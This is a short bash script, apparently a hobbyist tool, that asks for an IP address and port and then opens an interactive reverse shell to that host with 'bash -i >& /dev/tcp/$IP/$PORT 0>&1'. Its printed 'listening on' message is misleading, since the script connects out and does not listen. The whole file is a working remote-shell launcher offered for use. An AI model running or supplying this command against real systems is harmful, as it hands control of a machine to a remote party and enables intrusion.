#!/bin/bash
## Powered by Jasutin

clear;

printf "\e[1;33mEnter IP: \e[0m\n";
read IP

printf "\e[1;33mEnter port: \e[0m\n";
read PORT

clear;

printf "\n\e[1;36mlistening on $IP/$PORT ...\e[0m"
	bash -i >& /dev/tcp/$IP/$PORT 0>&1

	return 0;

exit 1;
